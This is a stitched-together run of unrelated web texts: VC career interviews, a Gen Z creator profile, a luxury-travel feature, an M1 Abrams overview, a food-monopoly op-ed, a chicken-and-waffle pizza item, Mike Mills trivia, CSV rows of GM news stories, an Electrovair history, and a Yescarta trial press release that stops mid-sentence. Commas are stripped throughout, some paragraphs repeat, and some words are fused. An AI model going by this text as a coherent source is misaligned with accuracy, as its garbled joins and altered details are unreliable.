My love for music specifically hip-hop took me to a music tech startup in Stockholm which is working to automate the licensing of music rights. After two years I wanted to go back to biosciences and healthcare so I studied an MPhil in Bioscience Enterprise at the University of Cambridge. While I was there I cofounded the Cambridge Femtech Society. After graduating I moved into VC and joined InHealth Ventures (IHV).

What deals have you worked on so far?

The first deal I was part of is the investment IHV made in Axuall a workforce intelligence network. Other deals we’re working on are within femtech in the female-specific chronic disease space and in technology-enabled care delivery solutions suited to developing world markets.

What sectors are you interested in? Any startups that are catching your eye?

I am really passionate about femtech. There’s a gap not only in how female-specific diseases are addressed by healthcare systems but also in how women+ are cared for when it comes to diseases which affect males and females differently and differentially (which is a lot of diseases including major indications like cardiovascular and autoimmune diseases). I’m also really excited by the next generation of behavioural and mental health therapies going beyond CBT-based solutions.

Top tips for breaking into VC?

I think it’s vital to be clear on why you want to enter VC. This will help you understand what stage and what sector to target. Once that is clear you can build relevant experience — for example having worked in an early-stage startup was incredibly helpful for me when it came to securing a role as an early-stage investor — and start building a relevant network.

Tom Rentschler investor at Acton Capital

Top tips for breaking into VC?

Top tips for breaking into VC?

I feel startup experience is key ideally pre-seed or seed stage in a small business development team and in building or operating. This helped me a lot in evaluating companies now and helps you gain a different perspective. Moreover building an edge in a specific niche relevant to venture will give you an advantage in the short-term especially if this specific knowledge is missing in that fund.

I think an exceptional investor has operational experience to bring to the table. What about working in (or even better: start) a startup/scaleup — and then “break into VC”. If you simply cannot wait to get at the other side of the table approach the VCs you like directly or see if someone in your network could help you connect with the right person.

There are very few job postings for young VCs so I would not rely on traditional applications. I'd first try to increase your VC exposure and network. There are a few things you can do to get there: I recommend podcasting posting good content on social media and getting small gigs at accelerators. Then I'd suggest directly sending high-quality deals to the connections you managed to build over time to showcase your ability to do the job.

Top tips for breaking into VC?

The most important trait in your early VC career is asking the right questions. You will be challenged to form your opinion about a team and a proposition after only a brief chat.

She adds that there are a lot of things to keep in mind while creating content such as understanding the target audience focusing on one’s own style ideating brainstorming and then bringing that idea to life. Post that it’s important to get approval from brands promote products and also get approval from the audience.

“I think there are many challenges there because every person is creative and doing something similar. You have to be out of the box to look different among the Gen Z creators and established creators” says Aastha.

Aastha started off her journey by making motivational content around her skin condition vitiligo and then she ventured into different avenues of content to break the monotony including dance fashion and makeup. She figured that making versatile content works really well with the audience. She adds that the Gen Z audience usually try to relate to someone’s content and that is when they end up engaging with it.





While speaking about planning and scheduling content she mentions that she has a lot of content ideas but is currently working as well and therefore she needs to manage her calendar in such a way that she can balance both work and content creation. Content creation is a full-time job she says adding “All day you’re just sitting and planning what’s coming up and what’s going to happen tomorrow.”.

Commenting on monetisation Aastha shares that it has become slightly easier for Gen Z creators to earn through their content. “It’s a vast platform to monetise our own passion” she says.

While the established creators have been around for a long time and have more experience Gen Z creators are learning from them and that is helping them monetise their content. The most important thing is to know what your audience likes and be your own self she says.





While dancing and motivational content will continue to be a part of her content going forward she plans to now focus on fashion and makeup as she feels that those are very large avenues.

Hear the word ""luxury"" and it's hard for our mind not to jump to the quintessential images of grandeur; silver service restaurants and first-class tickets white fluffy bathrobes and expensive shopping sprees. Days dedicated to nothing but being pampered into a state of bliss.

Defined as an ""inessential desirable state that is expensive or difficult to obtain"" luxury has long been the raison d'être for many a traveller. Born during the early 1900s leisure travel involved wealthy Americans hopping aboard fantastically lavish passenger ships bound for Europe as a sign of status.

We've come a long way since those opulent streamliners and the truth is that as travellers tastes and trends have changed so has the definition of ""luxury"".

Spurred along by cheap flights and Instagram brags Millennials and Gen Z travel more than any previous group. Photo / 123rf

Historically the lavishness of a trip was determined by objects (think crystal glasses of fine wine or penthouse suites with priceless views). However a new generation of jet setters and their particular values are changing the luxury travel industry from one marked by expensive extravagance to personalised experiences that are purpose-led ethical and enriching.

Cast an eye over the luxury market and you may be surprised to see it catering to a large percentage of Millennials. The 2019 Luxury Goods Worldwide Market Study reports that millennials account for 35 per cent of the luxury market; a number that will grow to 45 per cent by 2025. They aren't the only ones to watch either with the same study estimating Gen-Zers to hold 40 per cent of the market by 2025.

Globally-minded and social media-inspired Millennials and Gen Z aren't just overtaking the luxury market but the travel industry as well. Spurred along by cheap flights and Instagram brags these generations travel more (when lockdown restrictions allow) than any previous group meaning their values and aspirations hold key insights for how luxury travel will develop in coming years.

Luxury is…Customised

While buying a house or owning a car were the ultimate symbols of freedom and maturity for generations gone by the youth of today now consider travel to be the primary aspiration. The trips they take are often seen as an extension of their own identity.

It then makes sense that luxury has become less about objects anyone can purchase but customised one-of-a-kind experiences that reflect one's unique identity.

Travel companies like Carrier Untold Story Travel and Abercrombie & Kent all report an increased demand for personalised itineraries that focus on a person's individual interests or purposes.

Luxury is…Purpose-led

Just a few years ago luxury travel was largely defined by lavish locations like the fashion-forward streets of Milan or sun-drenched islands of Mykonos. Now as we increasingly use travel to express and explore our identity luxury travel has matured from ""where"" to the ""why""; the purpose that lies beneath the journey.

Anna Guillan AM a consultant at Kerzner International explains: ""the shift from developed destinations manufactured experiences lavishness and opulence has moved to authentic local regional and crafted."" She describes how this shift is driven by travellers' fundamental desire to create experiences that are authentic enriching and fulfilling.

Luxury is…Ethical

From their trendy canvas bags and organic cotton clothes to reusable keep cups and electric cars it's no secret Gen Z and Millennials prioritise sustainability and social responsibility when it comes to spending cash.

This is no different when it comes to their luxury travel.A 2020 study by Expedia Group Outlook found Gen Z travellers were the demographic most likely to consider sustainability when travelling (67 per cent) and prioritise travel businesses with environmentally friendly practices.

Make no mistake young travellers still want luxurious experiences and plush comforts they just want to enjoy them with a clear conscience too.

A recent study found that 86% of 18 to 29-year-olds valued sustainable travel options when it came to booking a trip. Photo / 123rf

Luxury is…Wellness

If you weren't fussed on juice cleanses organic cooking classes yoga retreats and meditation resorts chances are these health-enhancing experiences have become pretty attractive after months of lockdowns and virus scares.

However the relationship between wealth and wellness has been trending for a few years already. A complete 180 from previous centuries where indulgence and relaxation were the height of extravagance we now see luxury holidays as a way to invest in our health and wellbeing. Leading international hospitality groups like SBE have reported a ""significant rise"" in demand for health and wellness services across the globe.

The relationship between wealth and wellness was already trending a few years before the pandemic. Photo / 123rf

Luxury is…Off the Grid

Born or raised with a phone in their hand Millennials and Gen Z are likely to find the presence of technology in their life not just helpful but exhausting.

Tech is not solely a set of helpful tools and platforms but also as a thing to be escaped from time to time. An attitude that increasingly sees digital detoxes marketed as the ultimate form of indulgence.

While just a few years ago flashy digital devices were a mark of luxury and status abroad the constant presence of phones and screens in daily life has made 'unplugging' an aspirational luxury not everyone can afford.

According to a recent UK study 42 per cent of consumers see rest and recharging as a top priority for post-Covid holidays while a third express a desire to escape the noise of daily life and reconnect with nature something everyone regardless of age can no doubt sympathise with as we reach the end of 2021."

As part of the U.S. Army’s “Big 5” weapons platforms the M1 Abrams was developed to fight a defensive battle in Western Europe against overwhelming numbers of Soviet and Warsaw Pact T-72 tanks.

According to the U.S. Army website the Abrams is a full-tracked low-profile land combat assault weapon possessing unmatched survivability shoot-on-the-move lethality and a high degree of maneuverability.

“The Abrams tank sends a message to those who would oppose the United States as to the resolve capability and might of the U.S. Army” the service said on its website.

Late in 1988 the US Army awarded General Dynamics Land Systems a contract worth over US$350 million to carry out Full-Scale Engineering Development (FSED) of the M1A2 program. The first production M1A2s were completed late in 1992 with IOC achieved in 1993. Approved by the United States armed forces for production in 1990 the M1A2 represents the backbone of the U.S. Army.



The M1A2 MBT provides enhanced operational combat capabilities over that of the M1A1 MBT. The improvements of the M1A2 include Improved Commander's Weapon Station (ICWS) Commander's Independent Thermal Viewer (CITV) an Inter-Vehicular Information System (IVIS) Position/Navigation System (POS/NAV) and several survivability initiatives.



According to the military balance 2020 the United States has a total of 2389 Main Battle Tanks (MBTs) including 750 M1A1 SA Abrams 1605 M1A2 SEP V2 34+ M1A2C (M1A2 Abrams SEP V3) and 3300 M1A1/A2 in store. The M1A2 SEP V3 or M1A2C is the latest generation of M1A2 Abrams tanks in service with the United Armed Forces.

We all love a good bowl of Cheerios. And who doesn’t like Fritos bean dip with their tortilla chips? I’m betting that you’re like me and grab a can of soup or a jar of salsa off the shelf without thinking twice.

Well maybe next time we should.

A recent study revealed that just a few massively powerful companies control nearly 80% of the market share of many items purchased by ordinary consumers at the supermarket. Those Cheerios I mentioned? Yep General Mills Kellogg and Post own almost 75% of the market. Those salsas and dips? PepsiCo (who owns Tostitos Lays and Fritos) owns a whopping 90% of that market.

So what’s the problem? Well with the ability of giant corporations to own so much of the American food system farmers workers and consumers are suffering. This week a joint investigation by the Guardian and Food and Water Watch found that a small number of corporations control virtually every part of the food supply chain–from seeds and fertilizers to slaughterhouses and supermarkets. This leads to limited power for farmers dangerous working conditions for workers and higher prices for consumers.

It is time that antitrust laws are put in place to limit these conglomerates and protect all people involved in this system.

Mega-companies like Kellog Kraft Heinz and Tyson that control the food system have significant ability to decide what the 2 million farmers across America grow and how much they are paid. In fact a measly 15 cents of every dollar we spend in the grocery store goes to a farmer.

Advocates also note that along with financial pressures there is a serious mental health crisis among farmers. Farmers are among the most likely to commit suicide compared with other occupations and more than 450 farmers died by suicide across the Midwest from 2014-2018 . Calls to the crisis hotline Farm Aid increased by 110% from 2017 to 2018.

Let’s try to remember the next time we eat a tortilla chip or a Sara Lee bagel (Grupo Bimbo owns almost 70% of the bagel market) a farmer had to grow the ingredients to make it. We would do well to remind giant food corporations of this as well and establish antitrust policies limiting their power and supporting the lives of farmers.

Additionally food industry workers who are predominantly migrants and people of color face dangerous situations at the hands of these corporations. It is widely known that farms especially meatpacking plants are among the most dangerous workplaces in the country. People work long hours for extremely low wages and are exposed to everything from pesticides and animal waste to dangerous machinery and toxic heat levels.

Finally consumers also bear the brunt of the American monopolistic food system. Economically speaking limited competition among businesses means higher prices and fewer choices for buyers. This could not be more true in the agricultural space. For decades until the 1990s most people shopped at local grocery stores. Now just four corporations–Walmart Kroger Costco and Albertsons–dominate over half of the retail space. That means we as consumers are limited in what stores we can go to and are at the mercy of the prices the companies want to set.

These are just a few of the ways in which the current American food monopoly impacts people at every stage of the process. Last week President Biden signed an executive order addressing monopolies across the country which included food and farming.

Let’s hope something comes of this order. It is time that antitrust laws are put in place to limit these conglomerates and protect all people involved in this system.

Where to Find Chicken and Waffle Pizza near Kalamazoo

On the Kalamazoo Menu Facebook group some commentors have noticed the trend pop up elsewhere in their social feeds and got curious if any Kalamazoo area restaurants or pizzerias have crafted a chicken and waffle pizza. Turns out they have.

It seems simple enough slice up some chicken tenders pop some waffle dough into an iron or run out and get a box of Eggo and top with some of your finest quality Log Cabin.

So where can you find chicken and waffle pizza near Kalamazoo? Turn out the Mitten in Grand Rapids and Long Island Cafe in Battle Creek either have it on the menu or have made it as a special.

The Origins of Chicken and Waffles

While you may envision a piece of fried chicken paired with a buttery waffle and syrup on the side that's not the origin of the dish. That version of chicken and waffles was first served at a supper club in Harlem in the late 1930. The dish actually dates back to the Pennsylvania Dutch in the 1600s serving stewed chicken over a plain waffle with gravy.

Neither is Chicken and waffle pizza a new phenomenon. Check YouTube and you'll find videos dating back a few years extolling the syrupy pie. Papa Johns tried a Chicken and Waffle pizza as part of the 'Nashville hot/hot honey' food trend of the late 2010s.

While food trends will come and go (as chicken and waffle pizza certainly will) some of these foods of the last century are still on your table today while some you have never heard of.

Mike Mills (director) shouldn’t be confused with Mike Mills (musician) – though at some point you have to imagine their paths crossed in a Gen X version of the Spider-Man meme. The latter of course was a key member of alt rock behemoths REM.

Though REM’s star waned in the 2000s – they gracefully called it quits in 2011 – the group could still pull in a large crowd such as a UK tour in 2005 culminating in a concert in Hyde Park. Along the way they played at Portman Road home of Ipswich Town FC.

The song wasco-written by Chris Norman who had had a 1978 hit Stumblin’ In with pioneering rocker Suzi Quatro.

In 1978 Quatro appeared as Leather Tuscadero in beloved 50s-set sitcom Happy Days. Jump forward to 1994 and you’ll find Happy Days appropriated ingeniously in Weezer’s Buddy Holly video directed by Spike Jonze. Jonze’s most recent feature Her from 2014 also starred Joaquin Phoenix. Both having jumped through commercials music videos and films at roughly the same time – and both with Coppola connections (Mills has a production company with Roman; Jonze was married to Sofia) – Mills and Jonze are almost as easily confused as Mills (director) and Mills (musician) but not Mills (Mick).

GM,General Motors,https://news.google.com/articles/CBMiVGh0dHBzOi8vd3d3LmFya2Fuc2Fzb25saW5lLmNvbS9uZXdzLzIwMjEvZGVjLzExL2Nlby1nbS1jaGFuZ2VkLWJ5LXZlbnRpbGF0b3Itb3V0cHV0L9IBAA?hl=en-US&gl=US&ceid=US%3Aen,CEO: GM changed by ventilator output | Arkansas Democrat Gazette,"



DETROIT -- The chief executive officer of General Motors said Thursday that the automaker learned valuable lessons last year when it stepped in to boost emergency production of ventilators to treat severely ill covid-19 patients.

The company was able to help a small West Coast ventilator maker start large-scale production in about a month. That gave GM the confidence that it could speed up other tasks such as bringing electric and other vehicles to market faster CEO Mary Barra said.

""Doing the ventilator project was kind of a game changer from a General Motors perspective from a culture-change perspective"" Barra said in a wide-ranging conversation with members of the Automotive Press Association of Detroit.

Barra said that in the past the GM management team would have resisted when told they needed to help a company that builds 250 ventilators per month accelerate production to 30000 in 150 days.

""They would have looked at me like I was crazy"" she said.

Instead employees approached the problem as if their loved ones might need the breathing machines and accomplished the goal Barra said. Still the company was accused by former President Donald Trump of moving too slowly.

[CORONAVIRUS: Click here for our complete coverage » arkansasonline.com/coronavirus]

In March of last year GM put hundreds of workers on the project to help Ventec Life Systems of the Seattle area ramp up its production at a time when there were fears that the country would run short of the breathing machines.

GM put up capital and converted an electronics factory in Indiana to help make the ventilators with a speed that one supply chain expert said was ""lightning fast.""

Barra said the company now uses the same approach for its own electric vehicles software and partially automated driver-assist systems.

A joint venture between GM and LG Energy Solution called Ultium Cells LLC plans to build an electric vehicle battery factory in Lansing Mich. which would be their third such factory in the U.S.

The plans were revealed in documents posted on the city's website Friday. The partners say the plant will cost up to $2.5 billion and employ as many as 1700 workers. The plant is expected to start operations in 2025.

GM has previously announced plans to build four North American battery factories. Locations of two have been announced Lordstown Ohio and Spring Hill Tenn.

Barra also took a mild shot at Tesla and its CEO Elon Musk. When asked about Musk's criticism of a Biden administration plan to give bigger tax credits to buyers of union-made electric vehicles she said it's much more difficult to build cars for the broader mass market versus selling luxury vehicles to a slice of buyers.

She said GM's stock is undervalued when compared with Tesla Rivian Lucid Motors all relatively new companies with big market valuations that focus solely on electric vehicles.

""Sometimes the iconic traditional company even though they're innovating quickly gets looked at with a different lens"" she said.

Barra also said she doesn't think GM will return to having huge stocks of vehicles on dealer lots now that it has managed to get by during a global computer chip shortage with lower stocks. While there are some customers who want to buy a vehicle immediately others want to order online and avoid going to a dealership and GM will serve them both she said.

Her comments came after the company announced two more steps to make sure it has raw materials for the transition from petroleum to battery power. The company announced a deal with MP Materials to supply rare earth metals and finished magnets for the electric vehicle motors from a new factory to be built in Fort Worth starting in 2023.

It's also negotiating what is likely to be a joint venture with Vacuumschmelze (VAC) of Germany to build a U.S. factory to make electric vehicle motor magnets. Production is scheduled to start in 2024 and will create ""hundreds of new jobs"" the companies said.

The companies didn't announce financial terms of the deals. Shilpan Amin GM's head of purchasing and supply chain said it has a parts supply agreement with MP Materials with no GM capital investment. The capital structure of the venture with VAC is still being worked out but the companies said they would build a plant together.

At present there are no factories in the U.S. equipped for large-scale production of electric vehicle motor magnets Amin said. MP said 90% of the supply now comes from China.

The moves come as automakers scramble to line up parts supplies for what is expected to be a dramatic shift from internal combustion engines to zero emission electric power during the coming decade. GM for instance has a goal of selling only electric passenger vehicles by 2035.

The moves come as automakers scramble to line up parts supplies for what is expected to be a dramatic shift from internal combustion engines to zero-emission electric power during the coming decade. GM for instance has a goal of selling only electric passenger vehicles by 2035.

The LMC Automotive consulting firm expects U.S. sales of new fully electric vehicles to hit nearly 400000 this year almost double last year’s figures. But they still make up only about 2.6% of sales. But the firm expects sales to grow to more than 730000 next year and more than 2 million by 2025. Even at 2 million EV sales still would be only about 12% of U.S. new vehicle sales.

MP Materials has the potential to supply magnets for about 500000 EV motors per year Amin said. Combined the two deals will supply all of GM’s magnet needs at least for the near term the company said.

MP said engineering and design work on the new 200000-square-foot plant are underway and that it will employ more than 100 people. The factory’s products also will go to clean energy electronic and defense markets the company said.",https://news.google.com/articles/CBMiQ2h0dHBzOi8vaW5zaWRlZXZzLmNvbS9uZXdzLzU1NDA0NC9nbS11bHRpdW0tY2VsbHMtcGxhbnQtbm92ZW1iZXIyMy_SAUdodHRwczovL2luc2lkZWV2cy5jb20vbmV3cy81NTQwNDQvZ20tdWx0aXVtLWNlbGxzLXBsYW50LW5vdmVtYmVyMjMvYW1wLw?hl=en-US&gl=US&ceid=US%3Aen,GM's First Ultium Battery Gigafactory Appears Almost Completed,"The Ultium Cells's first battery gigafactory under construction in Lordstown Ohio appears to be in the final stage of construction.

In a new flyover video recorded on November 23 and shared by Ray Noneya we can see a basically complete building but there are still plenty of things that have to be completed around. It's unknown how advanced the installation of manufacturing equipment inside is ahead of production start in 2022.

This is the first battery gigafactory that the GM's and LG Energy Solution's joint venture is building in the U.S. (the second one will be built in Spring Hill Tennessee). Two more plants are in the pipeline according to General Motors.

The plant in Lordstown Ohio is envisioned for 30 GWh annually with an option for more. It's a crucial investment for the ramp-up of the Ultium-based electric cars.

Initially the Ultium cells will be produced and supplied from other LG Energy Solution's plants but once tUltium Cells starts production it will carry the volume.

Other manufacturers including Ford and Stellantis are also engaged in battery gigafactory joint ventures in the U.S. Manufacturers in Europe also appear to prefer this type of business model which gives them more control over the battery supply.

December 12 2021 — A GM class action lawsuit has been filed for current and former owners and lessees of 2020 GMC Sierra 1500 and 2020 Chevy Silverado 1500 trucks.

The General Motors lawsuit alleges the trucks were sold with incorrect trailering information labels that overstated the gross combined weight rating by 1800 pounds.

Florida plaintiff Roger Snyder purchased a new 2020 GMC Sierra 1500 with an advertised gross combined weight rating (GCWR) of 16800 pounds which is the total allowable weight of the loaded vehicle and trailer including any fuel passengers cargo equipment and accessories.

The GM class action lawsuit says in the 2020 GMC Sierra 1500 owner's manual and GMC’s 2020 Trailering Guide GM tells customers to consult the trailering information label in order not to exceed the GCWR.

The trailering information label ""is a sticker inside of the driver’s doorjamb with VIN specific specifications for a vehicle’s towing and trailering capacity including the GCWR.""

GM warns consumers that exceeding the GCWR while towing “could not only cause severe damage to your vehicle or trailer but also put yourself your passengers and others in danger.”

The class action lawsuit alleges GM's marketing claims and technical specifications overstated the 2020 GMC Sierra 1500 and 2020 Chevrolet Silverado 1500 trailer weight ratings.

The GM lawsuit alleges the plaintiff received a letter in April 2021 informing him of the correct gross combined weight rating which had been overstated by 1800 pounds.

Instead of recalling the trucks the GM class action says the letter included an updated trailering information label for the customer to apply to their truck.

The GM class action lawsuit was filed in the U.S. District Court for the Southern District of Florida Miami Division: Roger Snyder v. General Motors LLC.

The story of the Electrovair began in 1964 when GM built the first Corvair fitted with an electric motor and a battery pack instead of a flat-six engine. There's not a lot of info on this prototype based on the first-gen Corvair but Chevrolet revisited the idea in 1966.By that time it had introduced the second-gen compact with a new suspension design to correct the notorious handling problems of the first Corvair Apparently GM picked the Corvair for its electrification project for two reasons. First it was the lightest car in its corporate lineup at around 2500 pounds (1134 kg). Second the Corvair was a rear-engined car making it the perfect candidate to receive an induction motor in the rear and a battery pack in the rather spacious front trunk.But Chevrolet also had loads of Corvairs sitting around as sales plummeted following the publication of Ralph Nader's book ""Unsafe at Any Speed"" in 1965.The Electrovair II based on a 1966 Monza four-door hardtop model looked identical to a regular Corvair inside and out. But the 2.7-liter flat-six mill was no longer filling up the space atop the rear axle having been swapped out for an AC induction motor.The unit was good for 115 horsepower. For reference the gas-powered 1966 Corvair delivered 95 horses in the base spec and 140 horsepower in range-topping trim.The motor got its juice from a 532-volt silver-oxide battery pack mounted under the front hood which acted as a trunk on the regular Corvair. The conversion added almost 1000 pounds (454 kg) to the car's curb weight which made the Corvair as heavy as a full-size Chevrolet Impala.But that's still lighter than a modern Tesla Model S  which tips the scales at more than 4300 pounds (1950 kg).GM claimed that the electrified Corvair needed around 16 seconds to hit 60 mph (97 kph) from a standing start. It seems painfully slow at first glance but thewas actually on par with the base Corvair. It was however some four seconds slower than the 140-horsepower sedan.The drivetrain topped out at 80 mph (129 kph) notably slower than the regular production Corvair good for 93 to 108 mph (150 to 174 kph) depending on engine specs.Range on the other hand was very limited since batteries were far from compact at the time and the Corvair 's trunk had its space limitations. GM advertised the Electrovair's range at 40 to 80 miles (64 to 129 km) on a full charge.But the almost unusable range wasn't the concept car's only problem. The high-density silver-oxide batteries were not only expensive and still heavy at the time but they also wore out after being recharged only 100 times.So they had to be replaced after the Electrovair covered 4000 to 8000 miles (6437 to 12875 km) a little more than a trip from New York to Los Angeles and back.But GM never planned to turn the electrified Corvair into a production model so the company was happy with the attention it got from showcasing the EV to astonished journalists.While some viewed the Electrovair as a preview of things to come little did they know that the electric car was still a few good decades away.As the early 1970s brought the first regulations for fuel economy and emissions automakers began focusing on new technologies for gasoline engines. GM's next venture into electric cars would only come in the late 1980s when the development of the iconic EV1 began.Chevrolet also built an electric concept based on the Chevette hatchback in 1978. It was named the Electrovette and was capable of traveling up to 50 miles at 30 mph (80 km at 48 kph) and had a top speed of 53 mph (85 kph).Finished in light metallic blue the Electrovair II has been kept and maintained to this day and it can be viewed on display inside GM's Renaissance Center in Detroit."

– ZUMA-7 Patient-Reported Outcomes Analysis Shows Yescarta Significantly Improves Quality of Life With Patients Returning to Baseline Faster With CAR T-Cell Therapy Than Current Standard of Care –

– These Data Demonstrate Yescarta as Potential New Standard of Care if Approved By Regulators –

SANTA MONICA Calif.--(BUSINESS WIRE)-- Kite a Gilead Company (Nasdaq: GILD) today announced results from the primary analysis of ZUMA-7 a global Phase 3 study evaluating Yescarta® (axicabtagene ciloleucel) as a one-time infusion in a head-to-head study against standard of care (SOC) for adults with large B-cell lymphoma (LBCL) who relapsed or were refractory to first-line treatment. Yescarta was evaluated against the current SOC which is a multi-step process intended to culminate in a stem cell transplant. ZUMA-7 was initiated in 2017 and is the first and largest Phase 3 randomized study of any CAR T-cell therapy in the second-line setting enrolling 359 patients in 77 centers around the world. ZUMA-7 is considered a landmark trial for being the only study to reach the clinically meaningful two-year follow-up milestone. The findings were featured in the American Society of Hematology (ASH) press briefing today at their 63rd ASH Annual Meeting & Exposition and in a simultaneous publication in the New England Journal of Medicine (NEJM). The data will also be presented in full at the ASH plenary session on Sunday December 12 (Abstract #2).

ZUMA-7 Global Phase 3 Clinical Trial Sites (Graphic: Business Wire)

With a median follow-up of over two years the study met the primary endpoint of event-free survival (EFS; hazard ratio 0.398; 95% CI: 0.308-0.514 P<0.0001). Yescarta demonstrated a 2.5 fold increase in patients who were alive at two years and did not require the need for additional cancer treatment or experienced cancer progression (40.5% vs. 16.3%) and a four-fold greater median EFS (8.3 mo. vs. 2.0 mo.) compared to SOC. These statistically significant and clinically meaningful results were not confounded by any bridging chemotherapy. Improvements in EFS with Yescarta were consistent across key patient subgroups including the elderly (HR: 0.276 [95% CI: 0.164-0.465]) primary refractory disease (HR: 0.426 [95% CI: 0.319-0.570]) high-grade B-cell lymphoma including double-hit and triple-hit lymphoma (HGBL; HR: 0.285 [95% CI: 0.137-0.593]) and double expressor lymphoma (HR: 0.424 [95% CI: 0.268-0.671]).

“The majority of patients with relapsed/refractory LBCL do not achieve long-term remission with currently available treatments and as we saw in this trial are often not able to complete the multi-step process that culminates in a transplant” said Frederick L. Locke MD ZUMA-7 Lead Principal Investigator and Co-Leader of the Immuno-Oncology Program at Moffitt Cancer Center Tampa Florida. “The results of ZUMA-7 are remarkable and represent a paradigm shift in the way that we should treat patients with LBCL in the second-line setting.”

Globally LBCL is the most common type of non-Hodgkin lymphoma (NHL). In the United States more than 18000 people are diagnosed with LBCL each year. About 30-40% of patients with LBCL will need second-line treatment as their cancer will either relapse (return) or become refractory (not respond) to initial treatment. SOC therapy with curative intent for this patient population is a multi-step process intended to lead to a stem cell transplant as definitive treatment. The process starts with chemoimmunotherapy and if a patient responds and can tolerate further treatment they move on to high-dose chemotherapy (HDT) followed by a stem cell transplant (ASCT). Unfortunately many patients do not advance through this lengthy process for a variety of reasons including lack of response to second-line chemotherapy treatment complications or further disease progression.

In ZUMA-7 nearly three times as many patients randomized to Yescarta ultimately received the definitive CAR T-cell therapy treatment (94%) versus those randomized to SOC (36%) who received HDT+ASCT. Among randomized patients overall response (ORR) and complete response (CR) rates were also higher with Yescarta (ORR: 83% vs. 50% odds ratio: 5.31 [95% CI: 3.1-8.9; P<0.0001]; CR rate: 65% vs. 32%). Median overall survival (OS) evaluated as a preplanned interim analysis favored Yescarta compared to SOC (not reached vs. 35.1 months respectively). The primary analysis of OS will occur at approximately 210 deaths.

In a separate ZUMA-7 analysis of patient-reported outcomes (PROs) which will also be shared in an ASH oral presentation on December 12 (Abstract #430) patients receiving Yescarta and eligible for the PROs portion of the study (n=165) showed significant and clinically meaningful improvements in quality of life (QoL) at Day 100 compared with those who received SOC (n=131) using a prespecified analysis for three PRO domains (EORTC QLQ-C30 Physical Functioning EORTC QLQ-C30 Global Health Status/QOL and EQ-5D-5L visual analog scale [VAS]). The data also suggest faster recovery to pretreatment QoL for patients treated with Yescarta versus SOC.

“Beyond the poor prognosis patients with relapsed or refractory LBCL also face substantially decreased quality of life with chemotherapy and stem cell transplant treatments” said Mahmoud Elsawy MD MSc ZUMA-7 Investigator and Medical Director of Immune Effector Cell Therapy Program at Queen Elizabeth II Health Sciences Centre and Assistant Professor at Dalhouse University Halifax NS Canada. “With the primary results of ZUMA-7 we see that axicabtagene ciloleucel offers superior clinical outcomes and with the PRO analysis we also have support that it provides a better quality of life for these patients. Giving patients not just more but also better quality time is always our goal.”

In the ZUMA-7 trial Yescarta had a manageable safety profile that was consistent with previous studies. Among the 170 Yescarta-treated patients evaluable for safety Grade ≥3 cytokine release syndrome (CRS) and neurologic events were observed in 6% and 21% of patients respectively. No Grade 5 CRS or neurologic events occurred. In the SOC arm 83% of patients had high grade events mostly cytopenias (low blood counts).

Global regulatory filings to expand the indication for Yescarta to include second-line relapsed or refractory LBCL based on the ZUMA-7 data are currently underway. The U.S. Food and Drug Administration (FDA) has accepted the supplemental Biologics License Application (sBLA) and granted Priority Review designation to Yescarta for this patient population with a target action date under the Prescription Drug User Fee Act (PDUFA) of April 1 2022. Regulatory submissions have also been filed with other global health authorities including the European Medicines Agency (EMA).

“The ZUMA-7 trial demonstrates the power of CAR T-cell therapy when used earlier in the course of treatment and for the first time shows the promise of CAR T to replace a standard of care that has been in place for decades” said Frank Neumann MD PhD Kite’s Global Head of Clinical Development. “Kite is the world’s leading company dedicated exclusively to cell therapy and we are committed to continuing to conduct groundbreaking research like the ZUMA-7 study to bring the hope of survival to more patients through this technology.”

About ZUMA-7 Study Design

ZUMA-7 is a randomized open-label global multicenter Phase 3 study evaluating the safety and efficacy of Yescarta versus current standard of care (SOC) for second-line therapy (platinum-based salvage combination chemoimmunotherapy regimen followed by high-dose therapy [HDT] and autologous stem cell transplant [ASCT] in those who respond to salvage chemotherapy) in adult patients with relapsed or refractory LBCL within 12 months of first-line therapy. In the study 359 patients in 77 centers around the world were randomized (1:1) to receive a single infusion of Yescarta or current SOC second-line therapy. The primary endpoint is event free survival (EFS) as determined by blinded central review and defined as the time from randomization to the earliest date of disease progression per Lugano Classification commencement of new lymphoma therapy or death from any cause. Key secondary endpoints include objective response rate (ORR) and overall survival (OS). Additional secondary endpoints include patient reported outcomes (PROs) and safety.

U.S. IMPORTANT SAFETY INFORMATION

BOXED WARNING: CYTOKINE RELEASE SYNDROME AND NEUROLOGIC TOXICITIES

Cytokine Release Syndrome (CRS) including fatal or life-threatening reactions occurred in patients receiving Yescarta. Do not administer Yescarta to patients with active infection or inflammatory disorders. Treat severe or life-threatening CRS with tocilizumab or tocilizumab and corticosteroids.

Neurologic toxicities including fatal or life-threatening reactions occurred in patients receiving Yescarta including concurrently with CRS or after CRS resolution. Monitor for neurologic toxicities after treatment with Yescarta. Provide supportive care and/or corticosteroids as needed.

Yescarta is available only through a restricted program under a Risk Evaluation and Mitigation Strategy (REMS) called the Yescarta and Tecartus REMS Program.

CYTOKINE RELEASE SYNDROME (CRS) including fatal or life-threatening reactions occurred. CRS occurred in 88% (224/254) of all patients with non-Hodgkin lymphoma (NHL) including Grade ≥3 in 10%. CRS occurred in 94% (101/108) of patients with large B-cell lymphoma (LBCL) including Grade ≥3 in 13%. Among patients with LBCL who died after receiving Yescarta 4 had ongoing CRS events at the time of death. The median time to onset of CRS was 2 days (range: 1-12 days) and the median duration was 7 days (range: 2-58 days) for patients with LBCL. CRS occurred in 84% (123/146) of patients with indolent non-Hodgkin lymphoma (iNHL) including Grade ≥3 in 8% (11/146). Among patients with iNHL who died after receiving Yescarta 1 patient had an ongoing CRS event at the time of death. The median time to onset of CRS was 4 days (range: 1-20 days) and median duration was 6 days (range: 1-27 days) for patients with iNHL. Key manifestations of CRS (≥10%) in all patients combined included fever (80%) hypotension (38%) tachycardia (29%) hypoxia (21%) chills (21%) and headache (13%). Serious events that may be associated with CRS include cardiac arrhythmias (including atrial fibrillation and ventricular tachycardia) cardiac arrest cardiac failure renal insufficiency capillary leak syndrome hypotension hypoxia multi-organ failure and hemophagocytic lymphohistiocytosis/macrophage activation syndrome. In a subsequent cohort of LBCL patients tocilizumab and/or corticosteroids were administered for ongoing Grade 1 events. CRS occurred in 93% (38/41) of these patients and 2% (1/41) had Grade 3 CRS with no patients experiencing a Grade 4 or 5 event. The median time to onset of CRS was 2 days (range: 1 to 8 days) and the median duration of CRS was 7 days (range: 2 to 16 days). Key manifestations of CRS (>5%) included pyrexia hypotension chills headache nausea tachycardia C-reactive protein increased fatigue hypoxia and vomiting. Ensure that 2 doses of tocilizumab are available prior to Yescarta infusion. Following infusion monitor patients for signs and symptoms 